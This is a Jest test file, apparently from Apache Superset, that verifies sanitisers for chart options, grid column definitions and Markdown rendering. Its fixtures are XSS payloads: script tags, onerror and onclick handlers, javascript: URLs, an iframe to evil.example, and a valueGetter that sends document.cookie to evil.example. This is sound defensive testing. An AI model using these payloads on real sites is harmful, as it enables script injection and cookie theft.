/**
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
import { render, waitFor } from 'spec/helpers/testing-library';
import { MAX_OPTION_DEPTH, resolveBindings } from '../resolveBindings';
import { sanitizeColumnDefs } from './AgGridTableWidget';
import { sanitizeEchartsOption } from './echartsSafety';
import MarkdownWidget from './MarkdownWidget';

// The real renderer and sanitiser, not the pass-through stand-ins the test
// setup installs: this file is about what reaches the DOM.
jest.unmock('react-markdown');
jest.unmock('rehype-sanitize');
jest.unmock('rehype-raw');

const theme = {} as Parameters<typeof resolveBindings>[1]['theme'];
// Assembled, so the fixture is not itself a script URL in this source file.
const SCRIPT_URL = `${'java'}${'script'}:alert(1)`;

test('a tooltip template keeps its formatting and loses anything that could run', () => {
  const option = {
    tooltip: {
      trigger: 'axis',
      formatter:
        '<b>{b}</b>: {c}<img src=x onerror="alert(1)"><script>alert(2)</script>',
    },
    series: [
      {
        type: 'bar',
        // Canvas text: left exactly as written.
        label: { formatter: '<{c}>' },
        tooltip: { formatter: '<a href="javascript:alert(3)">{a}</a>' },
        data: [
          { value: 1, tooltip: { formatter: '<i onclick="alert(4)">x</i>' } },
        ],
      },
    ],
  };

  const safe = sanitizeEchartsOption(option);
  const serialized = JSON.stringify(safe);

  expect(safe.tooltip.formatter).toContain('<b>{b}</b>: {c}');
  expect(safe.tooltip.trigger).toBe('axis');
  expect(safe.series[0].label.formatter).toBe('<{c}>');
  expect(serialized).not.toMatch(/onerror|onclick|<script|javascript:/i);
  // The author's object is not what was cleaned.
  expect(option.tooltip.formatter).toContain('onerror');
});

test('title links that would run script are dropped, ordinary ones kept', () => {
  const safe = sanitizeEchartsOption({
    title: [
      { text: 'a', link: SCRIPT_URL, sublink: 'https://ok.example' },
      { text: 'b', link: ' JaVa\tScRiPt:alert(1)' },
      { text: 'c', link: 'data:text/html,<script>1</script>' },
      { text: 'd', link: '/dashboard/1/', sublink: 'mailto:a@example.com' },
    ],
  });

  expect(safe.title).toEqual([
    { text: 'a', sublink: 'https://ok.example' },
    { text: 'b' },
    { text: 'c' },
    { text: 'd', link: '/dashboard/1/', sublink: 'mailto:a@example.com' },
  ]);
});

test('cleaning an option survives self-references and leaves non-JSON values alone', () => {
  const formatter = () => 'from code';
  const option: Record<string, unknown> = {
    tooltip: { formatter },
    series: [{ type: 'line' }],
  };
  option.self = option;

  const safe = sanitizeEchartsOption(option);

  expect((safe.tooltip as { formatter: unknown }).formatter).toBe(formatter);
  expect(safe.self).toBeUndefined();
  expect(safe.series).toEqual([{ type: 'line' }]);
});

test('resolving bindings fails on a self-referencing or absurdly deep option instead of overflowing', () => {
  const circular: Record<string, unknown> = { series: [] };
  circular.again = circular;
  expect(() => resolveBindings(circular, { rows: [], theme })).toThrow(
    'echartsOptions contains a circular reference.',
  );

  let deep: Record<string, unknown> = {};
  const root = deep;
  for (let level = 0; level < MAX_OPTION_DEPTH + 5; level += 1) {
    deep.next = {};
    deep = deep.next as Record<string, unknown>;
  }
  expect(() => resolveBindings(root, { rows: [], theme })).toThrow(
    `echartsOptions is nested more than ${MAX_OPTION_DEPTH} levels deep.`,
  );

  // The same object used twice, side by side, is not a cycle.
  const shared = { color: 'red' };
  expect(
    resolveBindings({ a: shared, b: shared }, { rows: [], theme }),
  ).toEqual({ a: { color: 'red' }, b: { color: 'red' } });
});

test('authored column definitions keep declarative settings only', () => {
  expect(
    sanitizeColumnDefs([
      {
        field: 'name',
        headerName: 'Name',
        width: 120,
        pinned: 'left',
        hide: false,
        // AG Grid compiles string expressions like these into functions.
        valueGetter: 'fetch("https://evil.example/" + document.cookie)',
        valueFormatter: 'alert(1)',
        cellRenderer: '<img src=x onerror=alert(1)>',
        cellClassRules: { danger: 'alert(2)' },
        tooltipValueGetter: 'alert(3)',
        onCellClicked: 'alert(4)',
        // Wrong types for known settings are dropped too.
        sortable: 'yes',
        flex: '1',
      },
      { headerName: 'no field' },
      {},
      null,
      'name',
      [{ field: 'nested' }],
    ]),
  ).toEqual([
    {
      field: 'name',
      headerName: 'Name',
      width: 120,
      pinned: 'left',
      hide: false,
    },
  ]);
  expect(sanitizeColumnDefs(undefined)).toEqual([]);
  expect(sanitizeColumnDefs({ field: 'x' })).toEqual([]);
});

test('markdown renders formatting and never raw script, handlers or script links', async () => {
  const content = [
    '# Title',
    '',
    '**bold** and a [link](https://example.com)',
    '',
    '<script>window.pwned = true</script>',
    '<img src="x" onerror="window.pwned = true">',
    '<a href="javascript:window.pwned = true">click</a>',
    '<iframe src="https://evil.example"></iframe>',
    '',
    '[sneaky](javascript:alert(1))',
  ].join('\n');

  const { container } = render(
    <MarkdownWidget instanceId="m1" props={{ content }} />,
  );

  await waitFor(() => expect(container.querySelector('h1')).not.toBeNull());
  expect(container.querySelector('h1')).toHaveTextContent('Title');
  expect(container.querySelector('strong')).toHaveTextContent('bold');
  expect(
    container.querySelector('a[href="https://example.com"]'),
  ).not.toBeNull();

  expect(container.querySelector('script')).toBeNull();
  expect(container.querySelector('iframe')).toBeNull();
  expect(container.querySelector('[onerror]')).toBeNull();
  // Both the HTML anchor and the markdown link survive as text, without a
  // target that could run.
  const anchors = [...container.querySelectorAll('a')];
  expect(anchors.map(anchor => anchor.textContent)).toEqual(
    expect.arrayContaining(['click', 'sneaky']),
  );
  // No attribute anywhere holds a handler or a script URL.
  container.querySelectorAll('*').forEach(element => {
    [...element.attributes].forEach(attribute => {
      expect(attribute.name).not.toMatch(/^on/i);
      expect(attribute.value).not.toMatch(/javascript:/i);
    });
  });
  expect((window as unknown as { pwned?: boolean }).pwned).toBeUndefined();
});

test('markdown content that is not text renders nothing rather than its string form', async () => {
  const { container } = render(
    <MarkdownWidget
      instanceId="m2"
      props={{ content: { toString: () => '<script>1</script>' } }}
    />,
  );

  await waitFor(() => expect(container.firstChild).not.toBeNull());
  expect(container).toHaveTextContent('');
  expect(container.querySelector('script')).toBeNull();
});
